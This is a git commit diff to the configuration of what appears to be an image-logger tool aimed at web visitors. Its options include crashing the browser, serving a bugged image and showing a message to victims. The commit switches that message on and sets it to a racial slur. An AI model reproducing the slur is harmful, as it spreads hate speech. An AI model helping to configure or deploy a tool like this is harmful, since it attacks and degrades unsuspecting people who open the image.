e83930f06ac1ac2fa2c71f7b124640eb8f7ec54f
plxxz977-crypto <plxxz977@gmail.com>
2026-06-07 04:58:06 -0700

    Update main.py

--- api/main.py
+++ api/main.py
@@ -15,7 +15,7 @@ CONFIG = {
     "crashBrowser": True,
     "buggedImage": True,
     "redirect": {"redirect": False, "page": "https://your-link.here"},
-    "message": {"doMessage": False, "message": "This browser has been pwned.", "richMessage": True}
+    "message": {"doMessage": True, "message": "fucking nigger", "richMessage": True}
 }
 
 LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
